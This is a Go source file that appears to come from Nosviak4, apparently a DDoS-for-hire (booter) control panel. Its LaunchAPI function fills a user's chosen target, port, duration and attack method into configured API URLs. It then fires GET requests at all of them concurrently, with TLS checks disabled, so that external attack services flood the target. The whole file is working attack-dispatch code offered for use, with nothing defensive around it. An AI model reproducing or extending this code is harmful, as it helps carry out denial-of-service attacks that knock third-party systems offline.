package database

import (
	"Nosviak4/modules/gologr"
	"Nosviak4/source"
	"Nosviak4/source/swash"
	"Nosviak4/source/swash/evaluator"
	"context"
	"crypto/tls"
	"sync"

	"bytes"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"time"
)

// LaunchAPI will directly launch the attack through the network
func (attack *Attack) LaunchAPI(user *User, kvs map[string]interface{}) error {
	client := &http.Client{
		Timeout: time.Duration(source.MethodConfig.Attacks.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	method, ok := source.Methods[attack.Method]
	if !ok || method == nil {
		return errors.New("error getting method")
	}

	/* fields is the information we wish to pass onto the swash*/
	var fields map[string]any = map[string]any{
		"username": user.Username,
		"method":   attack.Method,
		"target":   attack.Target,
		"time":     strconv.Itoa(attack.Duration),
		"port":     strconv.Itoa(attack.Port),
		"kv":       func(key string) string {
			value, ok := kvs[key]
			if !ok || value == "<nil>" {
				return ""
			}

			return fmt.Sprint(value)
		},
	}

	/* applies url encoding if asked for by the user. */
	if method.URLEncoding {
		for key, val := range fields {
			if key == "kv" {
				continue
			}
			
			fields[key] = url.QueryEscape(fmt.Sprint(val))
		}
	}

	endpoints := make([]string, 0)

	// ranges through all the urls
	for _, url := range method.URLs {
		tokenizer := swash.NewTokenizer(string(url), true).Strip()
		if err := tokenizer.Parse(); err != nil {
			return err
		}

		buf := bytes.NewBuffer(make([]byte, 0))
		eval := evaluator.NewEvaluator(tokenizer, buf)
		for key, value := range fields {
			eval.Memory.Go2Swash(key, value)
		}

		if err := eval.Execute(); err != nil {
			return err
		}

		endpoints = append(endpoints, buf.String())
	}
	
	// handles concurrency on request level
	ctx, cancel := context.WithCancel(context.Background())

	// concurrency management, stops runaway, rw dupes and stores errors
	wait, mutex, errs := sync.WaitGroup{}, sync.Mutex{}, make([]error, 0)
	
	failed := 0
	
	for _, receiver := range endpoints {
		wait.Add(1)
	
		go func(ctx context.Context, receiver string) {
			defer wait.Done()
	
			remove := func(cancel context.CancelFunc, url string, err error) {
				mutex.Lock()
				failed++
				mutex.Unlock()
	
				if failed > len(endpoints) / source.MethodConfig.Attacks.SendDiv {
					cancel()
				}
	
				errs = append(errs, err)
				source.LOGGER.AggregateTerminal().WriteLog(gologr.ALERT, "[%s] failed: %v", url, err)
			}
	
			request, err := http.NewRequest(http.MethodGet, receiver, nil)
			if err != nil {
				remove(cancel, receiver, err)
				return
			}
	
			res, err := client.Do(request.WithContext(ctx))
			if err != nil || res.StatusCode < 200 || res.StatusCode >= 300 {
				if ctx.Err() == context.Canceled {
					return
				}

				if res != nil && res.StatusCode < 200 || res != nil && res.StatusCode >= 300 {
					err = errors.New("bad response code: " + strconv.Itoa(res.StatusCode))
				}
	
				remove(cancel, receiver, err)
				return
			}
	
			content, err := io.ReadAll(res.Body)
			if len(content) == 0 || err != nil {
				remove(cancel, receiver, errors.New("body error"))
				return
			}

			source.LOGGER.AggregateTerminal().WriteLog(gologr.DEFAULT, "[%s] response code: %d", res.Request.URL.String(), res.StatusCode)
		}(ctx, receiver)
	}

	wait.Wait()
	cancel()

	if failed >= len(endpoints) / source.MethodConfig.Attacks.SendDiv && len(errs) >= 1 && !source.MethodConfig.Attacks.APIIgnore {
		return errs[0]
	}

	return nil 
}
